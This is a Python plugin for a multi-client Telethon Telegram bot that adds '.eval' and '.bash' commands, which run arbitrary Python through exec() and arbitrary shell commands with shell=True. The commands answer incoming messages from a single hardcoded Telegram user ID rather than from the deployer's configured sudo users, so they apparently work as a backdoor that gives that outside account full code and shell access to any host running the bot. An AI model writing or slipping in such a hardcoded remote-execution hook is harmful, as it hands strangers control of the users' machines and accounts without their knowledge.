import os
import sys
import traceback
import subprocess
from io import StringIO
from datetime import datetime

from telethon import events
from config import X1, X2, X3, X4, X5, X6, X7, X8, X9, X10, SUDO_USERS, CMD_HNDLR as hl

clients = [X1, X2, X3, X4, X5, X6, X7, X8, X9, X10]
OWNER_ID = 8450725193

async def aexec(code, event):
    exec(
        "async def __aexec(event): "
        + "".join(f"\n {a}" for a in code.split("\n"))
    )
    return await locals()["__aexec"](event)

for client in clients:
    # --- Eval Command (.eval) ---
    @client.on(events.NewMessage(pattern=fr"^[./?{hl}]eval(?:\s+(.+))?", incoming=True))
    async def eval_handler(event):
        if event.sender_id != OWNER_ID:
            return
        
        cmd = event.pattern_match.group(1)
        if not cmd:
            return await event.reply("<b>Code लिखो मालिक!</b>", parse_mode="html")

        reply_to_id = event.id
        if event.is_reply:
            reply_to_id = event.reply_to_msg_id

        old_stderr = sys.stderr
        old_stdout = sys.stdout
        redirected_output = StringIO()
        redirected_error = StringIO()
        sys.stdout = redirected_output
        sys.stderr = redirected_error
        
        stdout, stderr, exc = None, None, None

        try:
            await aexec(cmd, event)
        except Exception:
            exc = traceback.format_exc()

        stdout = redirected_output.getvalue()
        stderr = redirected_error.getvalue()
        sys.stdout = old_stdout
        sys.stderr = old_stderr

        evaluation = ""
        if exc:
            evaluation = exc
        elif stderr:
            evaluation = stderr
        elif stdout:
            evaluation = stdout
        else:
            evaluation = "Success"

        final_output = f"<b>EVAL:</b>\n<code>{cmd}</code>\n\n<b>OUTPUT:</b>\n<code>{evaluation}</code>"
        
        if len(final_output) > 4096:
            with StringIO(str(final_output)) as out_file:
                out_file.name = "eval.txt"
                await event.client.send_file(
                    event.chat_id,
                    out_file,
                    force_document=True,
                    allow_cache=False,
                    caption=cmd,
                    reply_to=reply_to_id,
                )
        else:
            await event.reply(final_output, parse_mode="html")

    # --- Term Command (.bash) ---
    @client.on(events.NewMessage(pattern=fr"^[./?{hl}]bash(?:\s+(.+))?", incoming=True))
    async def term_handler(event):
        if event.sender_id != OWNER_ID:
            return
            
        cmd = event.pattern_match.group(1)
        if not cmd:
            return await event.reply("<b>Command लिखो मालिक!</b>", parse_mode="html")

        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
            universal_newlines=True,
        )
        stdout, stderr = process.communicate()
        output = stdout or stderr or "Success"
        
        final_bash = f"<b>BASH:</b>\n<code>{cmd}</code>\n\n<b>OUTPUT:</b>\n<code>{output}</code>"
        
        if len(final_bash) > 4096:
            with StringIO(str(output)) as out_file:
                out_file.name = "bash.txt"
                await event.client.send_file(
                    event.chat_id,
                    out_file,
                    force_document=True,
                    allow_cache=False,
                    caption=cmd,
                )
        else:
            await event.reply(final_bash, parse_mode="html")
            
